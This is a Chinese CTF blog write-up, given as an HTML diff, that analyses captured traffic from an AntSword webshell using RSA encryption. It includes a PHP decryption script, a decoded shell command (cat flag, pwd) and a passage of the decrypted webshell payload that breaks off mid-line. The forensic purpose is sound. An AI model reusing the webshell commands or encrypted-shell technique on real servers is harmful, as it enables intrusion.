@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路参考链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6701https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzI0MDI5MTQ3OQ&#x3D;&#x3D;&amp;mid&#x3D;2247483852&amp;idx&#x3D;1&amp;sn&#x3D;3cd3f667523550d414fad97231eeeaea&amp;chksm&#x3D;e91c5a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒月赛流量分析">
+<meta property="og:url" content="https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路参考链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6701https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzI0MDI5MTQ3OQ&#x3D;&#x3D;&amp;mid&#x3D;2247483852&amp;idx&#x3D;1&amp;sn&#x3D;3cd3f667523550d414fad97231eeeaea&amp;chksm&#x3D;e91c5a">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/awd1.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/awd2.jpg">
+<meta property="article:published_time" content="2020-04-28T14:36:49.000Z">
+<meta property="article:modified_time" content="2020-04-30T07:37:18.180Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/awd1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>安恒月赛流量分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&text=安恒月赛流量分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&is_video=false&description=安恒月赛流量分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=安恒月赛流量分析&body=Check out this article: https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&name=安恒月赛流量分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&t=安恒月赛流量分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%8F%E8%BF%87%E4%B8%80%E4%B8%8B%E5%8D%88%E7%9A%84%E5%A5%8B%E6%88%98%EF%BC%8C%E5%BC%84%E6%98%8E%E7%99%BD%E4%BA%86awdshell%E8%BF%99%E9%81%93%E9%A2%98%EF%BC%8C%E4%B8%8B%E9%9D%A2%E8%AF%B4%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">参考链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAHTTP%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">导出HTTP对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%BF%98%E5%8E%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">流量还原</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.2.4.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%BF%98%E5%8E%9F"><span class="toc-number">1.2.5.</span> <span class="toc-text">数据还原</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">题目总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E7%89%99%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">1.4.</span> <span class="toc-text">蓝牙数据包</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        安恒月赛流量分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-28T14:36:49.000Z" itemprop="datePublished">2020-04-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路"><a href="#经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路" class="headerlink" title="经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路"></a>经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6701">https://xz.aliyun.com/t/6701</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd">https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd</a><br>用到的知识：PHP OPENSSL，wireshark抓本地包（npcap），AES，wireshark流量分析、过滤语法、蚁剑RSA</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="导出HTTP对象"><a href="#导出HTTP对象" class="headerlink" title="导出HTTP对象"></a>导出HTTP对象</h3><p>首先常规操作就是导出http对象，发现有个upload.php，发现传了个不认识的马，写了公钥，考虑RSA加密。</p>
+<img src="http://cdn.polowong.top/static/images/awd1.jpg">
+<p>可以确定，传了个马，思路的重点应该向与马的交互上考虑。</p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>通过过滤数据包，确定了上传后的文件命名为1581335771.php，于是在数据包中重点观察与该文件的交互。<br>使用过滤器，语法：http and ip.dst==139.224.112.182 and http.request.method==POST</p>
+<img src="http://cdn.polowong.top/static/images/awd2.jpg">
+<p>按个追踪HTTP数据流看看呗，看看有啥有用的信息没。<br>追踪29543包的时候，发现了字符串L3Zhci93d3cvaHRtbC9hZG1pbi91cGxvYWQv，可能是base64，解一下发现是/var/www/html/admin/upload/，应该是文件的上传路径。<br>剩下的HTTP流挨个追踪，返回的数据都是加密后的，返回数据暂时没有什么有用的。于是继续注意发送的数据。<br>在追踪倒数第二个HTTP流的时候，发现了一些蛛丝马迹。发送的数据那有Y2QgIi92YXIvd3d3L2h0bWwvYWRtaW4vdXBsb2FkIjtjYXQgZmxhZztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=，经解密后发现是cd “/var/www/html/admin/upload”;cat flag;echo [S];pwd;echo [E]，这里可能藏了flag。所以应该对该数据包发送的数据进行还原。</p>
+<h3 id="流量还原"><a href="#流量还原" class="headerlink" title="流量还原"></a>流量还原</h3><p>由于导出HTP对象的时候有个公钥，考虑非对称加密（RSA），结合题目给的关键字ant与给出的shell的格式，可以确定这是用蚁剑连的shell，并且发送数据经过了RSA加密。<br>可以写个脚本把发送的数据还原出来。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ant</span>=<span class="string">&quot;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&quot;</span>;</span><br><span class="line"><span class="variable">$pk</span> = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$cmds</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$ant</span>);</span><br><span class="line"><span class="variable">$pk</span> = openssl_pkey_get_public(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还原后的数据是:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;@session_start();<span class="variable">$key</span>=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>,<span class="number">16</span>);<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));&#125;;;<span class="function"><span class="keyword">function</span> <span 